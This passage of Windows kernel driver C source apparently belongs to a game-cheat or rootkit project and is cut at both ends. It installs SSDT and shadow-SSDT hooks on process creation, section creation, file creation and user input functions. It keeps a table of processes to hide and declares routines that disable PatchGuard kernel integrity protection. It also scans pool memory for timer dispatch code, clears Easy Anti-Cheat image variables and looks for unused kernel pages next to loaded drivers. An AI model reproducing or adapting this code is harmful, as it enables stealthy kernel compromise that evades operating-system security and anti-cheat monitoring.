		__except (1) {
			LOG_DEBUG("__except  code %08X\n", GetExceptionCode());
		}



	}
	return TruePspCreateProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ParentProcess,
		Flags, SectionHandle, DebugPort, ExceptionPort);
}


__int64  wMiCreateSectionCommon(
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER MaximumSize,
	ULONG SectionPageProtection,
	int a6,
	__int64 a7,
	volatile void* Address,
	int a8,
	int Flags) {


	PUNICODE_STRING bString = 0;
	if (ObjectAttributes &&
		ObjectAttributes->ObjectName &&
		ObjectAttributes->ObjectName->Buffer)
	{
		__try {
			wchar_t FileName[256] = { 0 };
			LONG iPos = findUnicodeWchar(ObjectAttributes->ObjectName, '\\');
			if (iPos != -1) {

				DWORD cLen = ObjectAttributes->ObjectName->Length - (iPos + 1) * 2;
				if (cLen > sizeof(FileName))
				{
					LOG_DEBUG("ERROR: Size:%d\n", cLen);
				}
				else
				{
					__try {

						RtlCopyMemory(FileName, &ObjectAttributes->ObjectName->Buffer[iPos + 1], cLen);
					}
					__except (1) {
						LOG_DEBUG("__except  Len %d  %d %d %d \n", ObjectAttributes->ObjectName->Length,
							cLen, iPos);
					}
				}
			}
			else {

				RtlCopyMemory(FileName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);

			}
			TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
			RtlInitUnicodeString(&sFilter.stringSrc, FileName);
			PTABLE_UNICODE_STRING_FILTER pVl = findUnicodeStringAvl(&sFilter);
			if (pVl != 0) {
				LOG_DEBUG("1-Section--way: %ws\n", ObjectAttributes->ObjectName->Buffer);
				//RtlInitUnicodeString(ObjectAttributes->ObjectName, pVl->stringReplace.Buffer);
				//RtlCopyUnicodeString(ObjectAttributes->ObjectName, &pVl->stringReplace);

				bString = ObjectAttributes->ObjectName;
				ObjectAttributes->ObjectName = &pVl->stringReplace;
				//OBJECT_ATTRIBUTES mObjectAttributes;
				//RtlCopyMemory(&mObjectAttributes, ObjectAttributes, sizeof(mObjectAttributes));
				//mObjectAttributes.ObjectName = &pVl->stringReplace;
				LOG_DEBUG("2-Section-way: %ws\n", ObjectAttributes->ObjectName->Buffer);
				//RtlCopyUnicodeString()

			//	RtlCopyUnicodeString(ObjectAttributes->ObjectName, &pVl->stringReplace);

				//return TrueMiCreateSectionCommon(SectionHandle, DesiredAccess, &mObjectAttributes,
				//	MaximumSize, SectionPageProtection, a6, a7, Address, a8, Flags);
			}



		}
		__except (1) {
			LOG_DEBUG(" __except %08X\n", GetExceptionCode());

		}




	}
	NTSTATUS rNt = TrueMiCreateSectionCommon(SectionHandle, DesiredAccess, ObjectAttributes,
		MaximumSize, SectionPageProtection, a6, a7, Address, a8, Flags);
	if (bString != 0)
	{
		LOG_DEBUG(" return %08X\n", rNt);
		ObjectAttributes->ObjectName = bString;
	}
	return rNt;

}




__int64 wMiFreeUltraMapping(unsigned __int64 a1) {

	__try
	{
		return TrueMiFreeUltraMapping(a1);
	}
	__except (1) {

		LOG_DEBUG("error except %08X\n", GetExceptionCode());
	}
	return 0;
}




extern get_PspCidTable(ULONG64* tableAddr);

//#include "Hide.h"

#include "HandleHide.h"

#include "SSDT_HOOK.h"


extern ULONG_PTR kernelBase;
extern char* _ASM_GET_CALL(char* pAdr, int num);
extern ULONGLONG _CODE_GET_REAL_ADDRESS(char* pEl);





int easy_anti_patchguard(uintptr_t search_base);

extern char* _ASM_MOV_RAX(char* pAdr, int num);

extern BOOLEAN  SSDT_HOOK_NOW(PVOID pNewFun, PVOID pOldFun, PVOID CALLFUN);

extern LONG _CODE_GET_OFFSET(char* pEl);



// 很开RAX 取得Index
LONG ZwFunGetIndex(wchar_t* _FunName) {
	UNICODE_STRING FuncNameZ;
	RtlInitUnicodeString(&FuncNameZ, _FunName);
	char* pZwFun = MmGetSystemRoutineAddress(&FuncNameZ);
	if (pZwFun == 0) {
		LOG_DEBUG("can't  find %ws\n", _FunName);
		return -1;
	}
	LONG  FunIndex = _CODE_GET_OFFSET(_ASM_MOV_RAX(pZwFun, 1));
	return FunIndex;
}


ULONGLONG ZwFuncGetNtFun(wchar_t* _FunName) {
	long Index = ZwFunGetIndex(_FunName);
	LOG_DEBUG("%ws  Index %d\n", _FunName, Index);
	if (Index == -1) {
		return 0;
	}
	if (Index > 0x1000 && Index < 0x3000) // Show
	{
		return GetSSDTSHOWFuncAddr(Index);
	}
	if (Index < 0x1000)
	{
		return GetSSDTFuncAddr(Index);
	}
	return 0;
}

ULONGLONG _CODE_GET_REAL_ADDRESS_0(char* pEl, int nCodeSize);

extern char* _ASM_MOV_RBX(char* pAdr, int num);

extern char* _ASM_MOV_RCX_NOW(char* pAdr, int num);

extern char* _ASM_AND_EDI_NOW(char* pAdr, int num);

extern  ULONGLONG _CODE_GET_REAL_QDWORD(char* pEl, int nCodeSize);

extern  ULONG _CODE_GET_REAL_DWORD(char* pEl, int nCodeSize);


void disable_pg_bigPool();



//ULONGLONG  getRoutineAddress(wchar_t* name) {
//	UNICODE_STRING fName;
//	RtlInitUnicodeString(&fName, name);
//	PVOID fAddress = MmGetSystemRoutineAddress(&fName);
//	return (ULONGLONG)fAddress;
//}



//---------------------------------------------------





extern NTSTATUS DisablePatchProtection();



#define __rva_to_va_ex(p, offset) \
            ((PVOID)((signed char *)(p) + *(signed int *)(p) + sizeof(signed int) + (offset)))



extern char* _ASM_MOV_RDX(char* pAdr, int num);
extern char* _ASM_MOV_RCX(char* pAdr, int num);



BOOLEAN _cmpMemory(char* A, char* B, DWORD nSize) {
	for (DWORD i = 0; i < nSize; i++){

		if (A[i] != B[i]) {
			return FALSE;
		}
	}
	return TRUE;
}


char* _findPage(char* va, char* val, DWORD nSize) {

	for (DWORD i = 0; i < (PAGE_SIZE - nSize); i++)
	{
		if (_cmpMemory(va + i, val, nSize)) {
			return va + i;
		}
	}
	return 0;
}

char* _findMemory(char* va, DWORD vaSize, char* val, DWORD nSize) {

	for (DWORD i = 0; i < (vaSize - nSize); i++)
	{
		if (_cmpMemory(va + i, val, nSize)) {
			return va + i;
		}
	}
	return 0;
}

char* __findFuntionEntry(char* p) {

	for (int i = 0; i < 0x100; i++) {
		if (*(DWORD*)(p - i - 4) == 0xCCCCCCCC)
		{
			return p - i;
		}
	}
	return 0;
}


void BigPool() {

	ULONGLONG* uPoolBigPageTable = 0;
	ULONGLONG* uPoolBigPageTableSize = 0;
	if (uExGetBigPoolInfo != 0)
	{
		uPoolBigPageTable = (ULONGLONG *)_CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RDX((char *)uExGetBigPoolInfo, 1), 3);
		uPoolBigPageTableSize = (ULONGLONG*)_CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RCX((char *)uExGetBigPoolInfo, 1), 3);
		LOG_DEBUG("BigPoolInfo <%p><%p>\n", *uPoolBigPageTable, *uPoolBigPageTableSize);
	}


	if (uPoolBigPageTableSize == 0 || uPoolBigPageTable == 0)
	{
		return;
	}


	DWORD Offset =
		OsVersion.dwBuildNumber > 20000 ?
		sizeof(POOL_BIG_PAGESEX) : sizeof(POOL_BIG_PAGES);


	PPOOL_BIG_PAGES bPoolBigPage = (PPOOL_BIG_PAGES)*uPoolBigPageTable;
	PPOOL_BIG_PAGES PoolBigPage = 0;
	DWORD64 nSize = *uPoolBigPageTableSize;
	char Elm[] = { 0x48, 0xB8,0,0,0,0,0,0x80,0xFF,0xFF };
	for (DWORD i = 0; i < nSize; i++) {

		PoolBigPage =   (PPOOL_BIG_PAGES)((ULONGLONG)bPoolBigPage + i * Offset);
		//如果是1 就是空闲状态
		if ((((ULONGLONG)PoolBigPage->Va) & 0x1) == 0 &&
			MmIsNonPagedSystemAddressValid(PoolBigPage->Va))
		{

			char* nFindBuffer = _findMemory(PoolBigPage->Va, (DWORD)PoolBigPage->NumberOfPages, Elm, sizeof(Elm));
			if (nFindBuffer != 0)
			{
				DWORD64 fEntry = (DWORD64)__findFuntionEntry(nFindBuffer);
				LOG_DEBUG("BigPool 1 <%p><%p>\n", PoolBigPage->Va, nFindBuffer);
				if (fEntry != 0)
				{
					LOG_DEBUG("BigPool 2 <%p><%p>\n", PoolBigPage->Va, fEntry);
					uKiTimerDispatch = fEntry;

					KiTimerDispatch[0] = *(DWORD*)(uKiTimerDispatch);
					KiTimerDispatch[1] = *(DWORD*)(uKiTimerDispatch + sizeof(DWORD));
					KiTimerDispatch[2] = *(DWORD*)(uKiTimerDispatch + sizeof(DWORD) * 2);
					//	DbgPrint("KiTimerDispatch :%p \n", va);
					LOG_DEBUG("find  KiTimerDispatch <%p>\n", uKiTimerDispatch);
					//LOG_DEBUG(" BASE + %08X\n", (ULONGLONG)uKiTimerDispatch - (ULONGLONG)search_base);
					LOG_DEBUG("find  KiTimerDispatch1 <%08X>\n", KiTimerDispatch[0]);
					LOG_DEBUG("find  KiTimerDispatch2 <%08X>\n", KiTimerDispatch[1]);
					LOG_DEBUG("find  KiTimerDispatch3 <%08X>\n", KiTimerDispatch[2]);

				}


			}
			//page_re
			//LOG_DEBUG("BigPool <%p><%08X>\n", PoolBigPage->Va, PoolBigPage->NumberOfPages);
		}
	}

}




BOOLEAN IniFilterMutex() {


	__try
	{
		if (uObCreateObject == 0 || uObOpenObjectByName == 0)
		{
			return FALSE;
		}
		//LOG_DEBUG("HOOK uObCreateObject<%p>   ExMutantObjectType <%p>\n", uObCreateObject, ExMutantObjectType);
		//SSDT_HOOK_NOW(wObCreateObjectEx, uObCreateObject, &TrueObCreateObjectEx);
		//LOG_DEBUG("HOOK uObOpenObjectByName<%p>\n", uObOpenObjectByName);
		//SSDT_HOOK_NOW(wObOpenObjectByName, uObOpenObjectByName, &TrueObOpenObjectByName);
		return TRUE;
	}
	__except (1) {

	}

	return FALSE;
}


BOOLEAN IniFilterFile() {

	__try
	{
		if (uIopCreateFile) {
			return SSDT_HOOK_NOW(&wIopCreateFile, (PVOID)uIopCreateFile, &TrueIopCreateFile);
		}
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}


	return FALSE;
}

extern void PcreateProcessNotifyRoutine2(
	HANDLE ParentId,
	HANDLE ProcessId,
	BOOLEAN Create
);

BOOLEAN IniFilterProcess() {




	//STATUS_ABANDONED
	return TRUE;
}

BOOLEAN IniInputData() {


	__try
	{


#ifdef INFINITY_HOOK
		if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
		{

			TrueNtUserGetRawInputData = GetSSDTSHOWFuncAddr(702);
			NtUserGetRawInputDataIndex = 0x1000 + 702;
			return TrueNtUserGetRawInputData;
			//return SSDT_SHOW_HOOK(702, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
		}
		else if (OsVersion.dwBuildNumber < 17763 /*>=10240 && OsVersion.dwBuildNumber < 16299*/) {
			return FALSE;
		}
		else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {
			//	return SSDT_SHOW_HOOK(1019, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
			TrueNtUserGetRawInputData = GetSSDTSHOWFuncAddr(1019);
			NtUserGetRawInputDataIndex = 0x1000 + 1019;
			return TrueNtUserGetRawInputData;
		}
		else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
			//return SSDT_SHOW_HOOK(1029, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
			TrueNtUserGetRawInputData = GetSSDTSHOWFuncAddr(1029);
			NtUserGetRawInputDataIndex = 0x1000 + 1029;
			return TrueNtUserGetRawInputData;
		}
		else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
			//return SSDT_SHOW_HOOK(1077, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
			TrueNtUserGetRawInputData = GetSSDTSHOWFuncAddr(1077);
			NtUserGetRawInputDataIndex = 0x1000 + 1077;
			return TrueNtUserGetRawInputData;
		}
		else if (OsVersion.dwBuildNumber >= 20384) {
			TrueNtUserGetRawInputData = GetSSDTSHOWFuncAddr(1118);
			NtUserGetRawInputDataIndex = 0x1000 + 1118;
			return TrueNtUserGetRawInputData;
			//return SSDT_SHOW_HOOK(1118, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
		}
#else
		if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
		{
			return SSDT_SHOW_HOOK(702, Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
		}
		else if (OsVersion.dwBuildNumber < 17763 /*>=10240 && OsVersion.dwBuildNumber < 16299*/) {
			return FALSE;
		}
		else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {
			return SSDT_SHOW_HOOK(1019, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
		}
		else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
			return SSDT_SHOW_HOOK(1029, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
		}
		else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
			return SSDT_SHOW_HOOK(1077, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
		}
		else if (OsVersion.dwBuildNumber >= 20384) {
			return SSDT_SHOW_HOOK(1118, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
		}
#endif // INFINITY_HOOK
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}


	return FALSE;
}


BOOLEAN IniMustHwnd() {



	LOG_DEBUG(" dwBuildNumber %d\n", OsVersion.dwBuildNumber);


	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{


#ifdef INFINITY_HOOK
		TrueNtUserGetThreadState = GetSSDTSHOWFuncAddr(0);
		NtUserGetThreadStateIndex = 0x1000 + 0;

		TrueNtUserGetForegroundWindow = GetSSDTFuncAddr(60);
		NtUserGetForegroundWindowIndex = 0x1000 + 60;

		TrueNtUserWindowFromPoint = GetSSDTSHOWFuncAddr(20);
		NtUserWindowFromPointIndex = 0x1000 + 20;

		return TrueNtUserGetThreadState && TrueNtUserGetForegroundWindow;
#else
		SSDT_SHOW_HOOK(0, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
		return SSDT_SHOW_HOOK(60, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
#endif // INFINITY_HOOK



#ifdef INFINITY_HOOK

#else

#endif // INFINITY_HOOK

	}
	else if (OsVersion.dwBuildNumber < 17763 /*>=10240 && OsVersion.dwBuildNumber < 16299*/) {

	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {

#ifdef INFINITY_HOOK

		TrueNtUserGetThreadState = GetSSDTSHOWFuncAddr(3);
		NtUserGetThreadStateIndex = 0x1000 + 3;

		TrueNtUserGetForegroundWindow = GetSSDTSHOWFuncAddr(63);
		NtUserGetForegroundWindowIndex = 0x1000 + 63;

		TrueNtUserWindowFromPoint = GetSSDTSHOWFuncAddr(20);
		NtUserWindowFromPointIndex = 0x1000 + 23;


		return TrueNtUserGetThreadState && TrueNtUserGetForegroundWindow;
#else
		SSDT_SHOW_HOOK(3, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);

		SSDT_SHOW_HOOK(23, &Br_NtUserWindowFromPoint, &TrueNtUserWindowFromPoint);

		return SSDT_SHOW_HOOK(63, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
#endif // INFINITY_HOOK



	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {

#ifdef INFINITY_HOOK
		TrueNtUserGetThreadState = GetSSDTSHOWFuncAddr(3);
		NtUserGetThreadStateIndex = 0x1000 + 3;

		TrueNtUserWindowFromPoint = GetSSDTSHOWFuncAddr(20);
		NtUserWindowFromPointIndex = 0x1000 + 23;

		TrueNtUserGetForegroundWindow = GetSSDTSHOWFuncAddr(63);
		NtUserGetForegroundWindowIndex = 0x1000 + 63;



		return TrueNtUserGetThreadState && TrueNtUserGetForegroundWindow;
#else
		SSDT_SHOW_HOOK(3, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
		SSDT_SHOW_HOOK(23, &Br_NtUserWindowFromPoint, &TrueNtUserWindowFromPoint);
		return SSDT_SHOW_HOOK(63, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
#endif // INFINITY_HOOK



	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {


		LOG_DEBUG("Ini dwBuildNumber  %d\n", OsVersion.dwBuildNumber);
#ifdef INFINITY_HOOK
		TrueNtUserGetThreadState = GetSSDTSHOWFuncAddr(0);
		NtUserGetThreadStateIndex = 0x1000 + 0;

		TrueNtUserWindowFromPoint = GetSSDTSHOWFuncAddr(20);
		NtUserWindowFromPointIndex = 0x1000 + 20;

		TrueNtUserGetForegroundWindow = GetSSDTSHOWFuncAddr(60);
		NtUserGetForegroundWindowIndex = 0x1000 + 60;

		return TrueNtUserGetThreadState && TrueNtUserGetForegroundWindow;
#else

		//MiSingleProcessMemory(IoGetCurrentProcess(), GetSSDTSHOWFuncAddr(0) & 0xFFFFFFFFFFFFF000, PAGE_SIZE);
		//MiSingleProcessMemory(IoGetCurrentProcess(), GetSSDTSHOWFuncAddr(20) & 0xFFFFFFFFFFFFF000, PAGE_SIZE);
		//MiSingleProcessMemory(IoGetCurrentProcess(), GetSSDTSHOWFuncAddr(60) & 0xFFFFFFFFFFFFF000, PAGE_SIZE);
		//LOG_DEBUG("222222  %d\n", __LINE__);
		//return TRUE;
		SSDT_SHOW_HOOK(0, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
		SSDT_SHOW_HOOK(20, &Br_NtUserWindowFromPoint, &TrueNtUserWindowFromPoint);
		return SSDT_SHOW_HOOK(60, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
#endif // INFINITY_HOOK




	}
	else if (OsVersion.dwBuildNumber >= 20384)
	{

#ifdef INFINITY_HOOK
		TrueNtUserGetThreadState = GetSSDTSHOWFuncAddr(0);
		NtUserGetThreadStateIndex = 0x1000 + 0;

		TrueNtUserGetForegroundWindow = GetSSDTFuncAddr(55);
		NtUserGetForegroundWindowIndex = 0x1000 + 55;

		return TrueNtUserGetThreadState && TrueNtUserGetForegroundWindow;
#else
		SSDT_SHOW_HOOK(0, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
		return SSDT_SHOW_HOOK(55, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
#endif // INFINITY_HOOK



	}
	return FALSE;
}


BOOLEAN IniMousePos() {

	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1) {

		TwoType = 0x69;

		//NtUserCallTwoParamIndex

#ifdef INFINITY_HOOK
		NtUserCallTwoParamIndex = 0x1000 + 42;
		TrueNtUserCallTwoParam = GetSSDTSHOWFuncAddr(42);
		return TRUE;
#else
		return SSDT_SHOW_HOOK(42, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
#endif // INFINITY_HOOK





	}
	else if (OsVersion.dwBuildNumber < 17763 /*>=10240 && OsVersion.dwBuildNumber < 16299*/) {

	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {


		TwoType = 0x82;
#ifdef INFINITY_HOOK
		NtUserCallTwoParamIndex = 0x1000 + 45;
		TrueNtUserCallTwoParam = GetSSDTSHOWFuncAddr(45);
		return TRUE;
#else
		return SSDT_SHOW_HOOK(45, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
#endif // INFINITY_HOOK



#ifdef INFINITY_HOOK

#else

#endif // INFINITY_HOOK

	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
		TwoType = 0x81;
		//

#ifdef INFINITY_HOOK
		NtUserCallTwoParamIndex = 0x1000 + 45;
		TrueNtUserCallTwoParam = GetSSDTSHOWFuncAddr(45);
		return TRUE;
#else
		return SSDT_SHOW_HOOK(45, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
#endif // INFINITY_HOOK



	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {

		TwoType = 0x7F;
#ifdef INFINITY_HOOK
		NtUserCallTwoParamIndex = 0x1000 + 42;
		TrueNtUserCallTwoParam = GetSSDTSHOWFuncAddr(42);
		return TRUE;
#else
		return SSDT_SHOW_HOOK(42, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
#endif // INFINITY_HOOK


		//
	}
	else if (OsVersion.dwBuildNumber >= 20384)
	{

	}
	return FALSE;
}


//RTL_AVL_TABLE


BOOLEAN bHideSucess = FALSE;



BOOLEAN  IsOpenProcessHide(HANDLE ID) {

	FILTER_PID Info = { 0 };
	Info.dwPID = ID;
	FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_HideProcess, &Info);
	if (pGr == 0)
	{
		return FALSE;
	}
	AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_HideProcess, &Info);
	return TRUE;
}

BOOLEAN  AddProcessHide(HANDLE ID) {
	FILTER_PID Info = { 0 };
	Info.dwPID = ID;
	FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_HideProcess, &Info);
	if (pGr != 0)
	{
		AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_HideProcess, &Info);
		return FALSE;
	}
	return (BOOLEAN)AVL_LOCK_CHANGE(AVL_ADD, &TableAvl_HideProcess, &Info);
}



extern char* _ASM_GET_JMP(char* pAdr, int num);

char* _ASM_MOV_RAX_FAR(char* pAdr, int num);
extern ULONGLONG _CODE_GET_OFFSETx64(char* pEl, int num);


unsigned char patch_code_Buffer[0x100] = { 0 };

ULONG CODE_SIZE = 0;

extern BOOLEAN bIniHideR;

extern ULONGLONG EAC_ImageBase;
extern ULONGLONG EAC_ImageSize;

VOID wSleep(LONG msec);
BOOLEAN IniHideProcess();





// 获取设备信息
VOID GetDeviceInfo(PDEVICE_OBJECT pDevObj)
{
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT pCurDevObj = pDevObj;
	POBJECT_NAME_INFORMATION pObjNameInfo = NULL;
	ULONG Length = 0;

	pObjNameInfo = (POBJECT_NAME_INFORMATION)ExAllocatePool(PagedPool, sizeof(OBJECT_NAME_INFORMATION));


	while (pCurDevObj != NULL)
	{
		RtlZeroMemory(pObjNameInfo, sizeof(OBJECT_NAME_INFORMATION));
		status = ObQueryNameString(pCurDevObj, pObjNameInfo, sizeof(OBJECT_NAME_INFORMATION), &Length);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("驱动对象%p:%wZ\t设备对象%p:%wZ\n",
				pCurDevObj->DriverObject,
				&pCurDevObj->DriverObject->DriverName,
				pCurDevObj,
				&pObjNameInfo->Name));
		}

		pCurDevObj = pCurDevObj->AttachedDevice;
	}
	ExFreePool(pObjNameInfo);
}


PDRIVER_OBJECT EnumDrvs(PDRIVER_OBJECT pDrvObj, PUNICODE_STRING pBaseName)
{

	PLDR_DATA_TABLE_ENTRY pLdrTblEntry = (PLDR_DATA_TABLE_ENTRY)pDrvObj->DriverSection;
	PLIST_ENTRY pListHdr = &pLdrTblEntry->InLoadOrderLinks;
	PLIST_ENTRY pListEntry = NULL;
	pListEntry = pListHdr->Flink;
	int i = 0;

	PDRIVER_OBJECT fObject = 0;
	wchar_t* Name = ExAllocatePoolWithTag(PagedPool, 0x1000, 'Tg');
	do
	{
		pLdrTblEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if (pLdrTblEntry->BaseDllName.Buffer != 0)
		{



			//GetDeviceInfo(pLdrTblEntry);

			LOG_DEBUG("%d  %wZ\t0x%I64X\t%I64u(B)\t0x%I64X\t%wZ\r\n", i,
				&pLdrTblEntry->BaseDllName,
				pLdrTblEntry->DllBase,
				pLdrTblEntry->SizeOfImage,
				pLdrTblEntry,
				&pLdrTblEntry->FullDllName
			);


			if (RtlEqualUnicodeString(&pLdrTblEntry->BaseDllName, pBaseName, TRUE))
			{
				LOG_DEBUG("Find Driver Object %wZ  <%p>\n", pBaseName, pLdrTblEntry);
				//return (PDRIVER_OBJECT)pLdrTblEntry;
				fObject = pLdrTblEntry;
			}




		}
		i++;
		pListEntry = pListEntry->Flink;
	} while (pListEntry != pListHdr);
	return fObject;
}





BOOLEAN FindPageNew(PDRIVER_OBJECT pDrvObj, int PageSize, PVOID * hMod, PVOID * NewMod)
{

	PLDR_DATA_TABLE_ENTRY pLdrTblEntry = (PLDR_DATA_TABLE_ENTRY)pDrvObj->DriverSection;
	PLIST_ENTRY pListHdr = &pLdrTblEntry->InLoadOrderLinks;
	PLIST_ENTRY pListEntry = NULL;
	pListEntry = pListHdr->Flink;
	int i = 0;

	PDRIVER_OBJECT fObject = 0;
	wchar_t* Name = ExAllocatePoolWithTag(PagedPool, 0x1000, 'Tg');
	do
	{
		pLdrTblEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if (pLdrTblEntry->BaseDllName.Buffer != 0)
		{

			ULONGLONG PtrZero = (ULONGLONG)pLdrTblEntry->DllBase + (ULONGLONG)pLdrTblEntry->SizeOfImage;

			if (PtrZero >> 32 == (ULONGLONG)kernelBase >> 32)
			{
				int nCount = 0;
				for (size_t i = 0; i < PageSize; i++)
				{


					ULONGLONG Ptr = PtrZero + i * PAGE_SIZE;

					PHYSICAL_ADDRESS phyAddress = MmGetPhysicalAddress(Ptr);
					if (phyAddress.QuadPart == 0) {

						DWORD64 PLM4[4] = { 0 };
						MiFillPteHierarchy(Ptr, PLM4);
						BOOLEAN uFun = TRUE;
						int i = 4;
						do
						{
							i--;
							MMPTE pCurMM = *(MMPTE*)PLM4[i];
							if (pCurMM.u.Hard.Valid == 0) {
								uFun = FALSE;
								break;
							}
						} while (i > 1);
						if (uFun)
						{
							nCount++;
						}
						else
						{
							break;
						}

						
					}
					else
					{
						break;
					}
				}

				if (nCount == PageSize) {
					*hMod = pLdrTblEntry->DllBase;
					*NewMod = (LPVOID)PtrZero;

					//pLdrTblEntry->SizeOfImage = pLdrTblEntry->SizeOfImage + PAGE_SIZE * PageSize;

					LOG_DEBUG("%d  %wZ\t0x%I64X\t%I64u(B)\t0x%I64X\t%wZ\r\n", i,
						&pLdrTblEntry->BaseDllName,
						pLdrTblEntry->DllBase,
						pLdrTblEntry->SizeOfImage,
						pLdrTblEntry,
						&pLdrTblEntry->FullDllName
					);

					return TRUE;
				}
			}
		}
		i++;
		pListEntry = pListEntry->Flink;
	} while (pListEntry != pListHdr);
	return FALSE;
}




PDRIVER_OBJECT EnumDrvsV(PDRIVER_OBJECT pDrvObj, PUNICODE_STRING pBaseName)
{

	PLDR_DATA_TABLE_ENTRY pLdrTblEntry = (PLDR_DATA_TABLE_ENTRY)pDrvObj->DriverSection;


	PDEVICE_OBJECT pCurDeviceObj = pDrvObj->DeviceObject;

	PDEVICE_OBJECT pCurDeviceObjV = pCurDeviceObj;


	//PLIST_ENTRY pListHdr = &pLdrTblEntry->InLoadOrderLinks;
	//PLIST_ENTRY pListEntry = NULL;
	//pListEntry = pListHdr->Flink;
	int i = 0;



	PDRIVER_OBJECT fObject = 0;
	//wchar_t* Name = ExAllocatePoolWithTag(PagedPool, 0x1000, 'Tg');



	do
	{
		PDRIVER_OBJECT pCurDrvObj = pCurDeviceObj->DriverObject;
		


		pLdrTblEntry = CONTAINING_RECORD(pCurDrvObj->DriverSection, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if (pLdrTblEntry->BaseDllName.Buffer != 0)
		{
			//GetDeviceInfo(pLdrTblEntry);
			LOG_DEBUG("%d  %wZ\t0x%I64X\t%I64u(B)\t0x%I64X\t%wZ\r\n", i,
				&pLdrTblEntry->BaseDllName,
				pLdrTblEntry->DllBase,
				pLdrTblEntry->SizeOfImage,
				pCurDrvObj,
				&pLdrTblEntry->FullDllName
			);

			if (RtlEqualUnicodeString(&pLdrTblEntry->BaseDllName, pBaseName, TRUE))
			{
				LOG_DEBUG("Find Driver Object %wZ  <%p>\n", pBaseName, pLdrTblEntry);
				//return (PDRIVER_OBJECT)pLdrTblEntry;
				fObject = pCurDrvObj;
			}
		}
		i++;
		pCurDeviceObj = pCurDeviceObj->NextDevice;
	} while (pCurDeviceObjV != pCurDeviceObj && pCurDeviceObj != 0);

	return fObject;
}





extern BOOLEAN GetDriverObjectByName(PDRIVER_OBJECT* DriverObject, WCHAR* DriverName);


PDRIVER_OBJECT FindDrvs(PUNICODE_STRING pBaseName) {

	PDRIVER_OBJECT BeepDriverObject = NULL;
	if (!GetDriverObjectByName(&BeepDriverObject, L"\\Driver\\Beep")){
		return 0;
	}
	PDRIVER_OBJECT pBaseObject = EnumDrvsV(BeepDriverObject, pBaseName);
	ObDereferenceObject(BeepDriverObject);
	return pBaseObject;
}


void server_IniHide(void* nothing){
	wSleep(15000);
	EAC_ImageBase = 0;
	EAC_ImageSize = 0;
	//*KiBugCheckActive = KiBugCheckActiveFlags;
	IniHideProcess();
}


#define BEGIN_DATA 0x10

BOOLEAN IniHideProcess() {
	//return TRUE;
	RTL_AVL_TABLE  TableAvl_HideProcess;
	unsigned char patch_code[] = {
		//0x81, 0x38, 0x2E, 0x48, 0x31, 0x11, 
		//0x74, 0x22, 
		//0x81, 0x38, 0x48, 0x31, 0x51, 0x48, 
